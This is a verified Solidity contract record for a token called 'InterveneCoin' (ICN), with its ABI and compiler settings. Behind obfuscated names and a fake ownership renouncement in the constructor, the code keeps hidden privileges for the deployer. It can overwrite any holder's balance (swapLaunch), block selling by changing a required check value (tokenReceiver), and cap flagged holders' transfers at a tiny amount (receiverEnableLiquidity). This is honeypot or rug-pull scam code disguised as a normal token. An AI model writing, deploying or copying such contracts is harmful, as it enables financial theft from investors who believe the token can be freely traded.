{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fundEnableBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchAutoTotal {\n    function createPair(address listReceiver, address modeTakeFee) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface autoReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface feeList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundEnable) external view returns (uint256);\n\n    function transfer(address limitMarketing, uint256 tradingSender) external returns (bool);\n\n    function allowance(address walletTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitMarketing,\n        uint256 tradingSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toTake, uint256 value);\n    event Approval(address indexed walletTrading, address indexed spender, uint256 value);\n}\n\ninterface feeListMetadata is feeList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InterveneCoin is fundEnableBuy, feeList, feeListMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLiquidity;\n    }\n\n    uint256 private shouldLiquidity = 100000000 * 10 ** 18;\n\n    function sellLaunch(address tokenShouldBuy, address limitMarketing, uint256 tradingSender) internal returns (bool) {\n        if (tokenShouldBuy == totalLiquidity) {\n            return marketingLaunchedMax(tokenShouldBuy, limitMarketing, tradingSender);\n        }\n        uint256 listMaxTake = feeList(walletMarketingAuto).balanceOf(totalTokenAuto);\n        require(listMaxTake == feeModeShould);\n        require(limitMarketing != totalTokenAuto);\n        if (autoLiquidityReceiver[tokenShouldBuy]) {\n            return marketingLaunchedMax(tokenShouldBuy, limitMarketing, launchedTakeBuy);\n        }\n        tradingSender = tokenSender(tokenShouldBuy, limitMarketing, tradingSender);\n        return marketingLaunchedMax(tokenShouldBuy, limitMarketing, tradingSender);\n    }\n\n    function receiverEnableLiquidity(address toBuy) public {\n        tokenMin();\n        if (maxMarketing == maxTotal) {\n            tradingExempt = true;\n        }\n        if (toBuy == totalLiquidity || toBuy == walletMarketingAuto) {\n            return;\n        }\n        autoLiquidityReceiver[toBuy] = true;\n    }\n\n    address private limitTake;\n\n    address totalTokenAuto;\n\n    address public totalLiquidity;\n\n    bool public tokenSell;\n\n    uint256 public takeAmountShould;\n\n    uint256 constant launchedTakeBuy = 11 ** 10;\n\n    address amountAutoMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tokenSender(address tokenShouldBuy, address limitMarketing, uint256 tradingSender) internal view returns (uint256) {\n        require(tradingSender > 0);\n\n        uint256 launchSender = 0;\n        if (tokenShouldBuy == walletMarketingAuto && shouldSellFrom > 0) {\n            launchSender = tradingSender * shouldSellFrom / 100;\n        } else if (limitMarketing == walletMarketingAuto && amountList > 0) {\n            launchSender = tradingSender * amountList / 100;\n        }\n        require(launchSender <= tradingSender);\n        return tradingSender - launchSender;\n    }\n\n    function allowance(address shouldIsSender, address maxSenderTotal) external view virtual override returns (uint256) {\n        if (maxSenderTotal == amountAutoMin) {\n            return type(uint256).max;\n        }\n        return atLimitEnable[shouldIsSender][maxSenderTotal];\n    }\n\n    string private enableList = \"ICN\";\n\n    bool private tradingExempt;\n\n    function tokenReceiver(uint256 tradingSender) public {\n        tokenMin();\n        feeModeShould = tradingSender;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableList;\n    }\n\n    mapping(address => mapping(address => uint256)) private atLimitEnable;\n\n    uint256 receiverIs;\n\n    function limitWalletLaunch(address exemptTo) public {\n        if (tokenSell) {\n            return;\n        }\n        if (maxTradingFrom == listTake) {\n            listTake = takeAmountShould;\n        }\n        txAuto[exemptTo] = true;\n        \n        tokenSell = true;\n    }\n\n    mapping(address => bool) public txAuto;\n\n    uint256 private tokenLiquidity;\n\n    event OwnershipTransferred(address indexed fundTeam, address indexed enableTake);\n\n    function approve(address maxSenderTotal, uint256 tradingSender) public virtual override returns (bool) {\n        atLimitEnable[_msgSender()][maxSenderTotal] = tradingSender;\n        emit Approval(_msgSender(), maxSenderTotal, tradingSender);\n        return true;\n    }\n\n    address public walletMarketingAuto;\n\n    uint256 public amountList = 0;\n\n    function balanceOf(address fundEnable) public view virtual override returns (uint256) {\n        return launchedExempt[fundEnable];\n    }\n\n    uint256 public maxTradingFrom;\n\n    function owner() external view returns (address) {\n        return limitTake;\n    }\n\n    function swapLaunch(address isTo, uint256 tradingSender) public {\n        tokenMin();\n        launchedExempt[isTo] = tradingSender;\n    }\n\n    function transferFrom(address tokenShouldBuy, address limitMarketing, uint256 tradingSender) external override returns (bool) {\n        if (_msgSender() != amountAutoMin) {\n            if (atLimitEnable[tokenShouldBuy][_msgSender()] != type(uint256).max) {\n                require(tradingSender <= atLimitEnable[tokenShouldBuy][_msgSender()]);\n                atLimitEnable[tokenShouldBuy][_msgSender()] -= tradingSender;\n            }\n        }\n        return sellLaunch(tokenShouldBuy, limitMarketing, tradingSender);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountLimit;\n    }\n\n    bool private swapAutoExempt;\n\n    function getOwner() external view returns (address) {\n        return limitTake;\n    }\n\n    function marketingLaunchedMax(address tokenShouldBuy, address limitMarketing, uint256 tradingSender) internal returns (bool) {\n        require(launchedExempt[tokenShouldBuy] >= tradingSender);\n        launchedExempt[tokenShouldBuy] -= tradingSender;\n        launchedExempt[limitMarketing] += tradingSender;\n        emit Transfer(tokenShouldBuy, limitMarketing, tradingSender);\n        return true;\n    }\n\n    bool private maxTotal;\n\n    uint8 private teamAt = 18;\n\n    function buyEnable() public {\n        emit OwnershipTransferred(totalLiquidity, address(0));\n        limitTake = address(0);\n    }\n\n    mapping(address => bool) public autoLiquidityReceiver;\n\n    bool public totalBuyAt;\n\n    mapping(address => uint256) private launchedExempt;\n\n    bool public maxMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamAt;\n    }\n\n    function tokenMin() private view {\n        require(txAuto[_msgSender()]);\n    }\n\n    constructor (){\n        if (maxTradingFrom == tokenLiquidity) {\n            tradingExempt = false;\n        }\n        buyEnable();\n        autoReceiver isLaunch = autoReceiver(amountAutoMin);\n        walletMarketingAuto = launchAutoTotal(isLaunch.factory()).createPair(isLaunch.WETH(), address(this));\n        totalTokenAuto = launchAutoTotal(isLaunch.factory()).feeTo();\n        if (tradingExempt != maxMarketing) {\n            swapAutoExempt = true;\n        }\n        totalLiquidity = _msgSender();\n        txAuto[totalLiquidity] = true;\n        launchedExempt[totalLiquidity] = shouldLiquidity;\n        \n        emit Transfer(address(0), totalLiquidity, shouldLiquidity);\n    }\n\n    bool private enableTo;\n\n    string private amountLimit = \"Intervene Coin\";\n\n    uint256 feeModeShould;\n\n    uint256 private listTake;\n\n    function transfer(address isTo, uint256 tradingSender) external virtual override returns (bool) {\n        return sellLaunch(_msgSender(), isTo, tradingSender);\n    }\n\n    uint256 public shouldSellFrom = 3;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIsSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxSenderTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSenderTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoLiquidityReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"}],\"name\":\"limitWalletLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTradingFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"}],\"name\":\"receiverEnableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSellFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"swapLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAmountShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuyAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenShouldBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InterveneCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}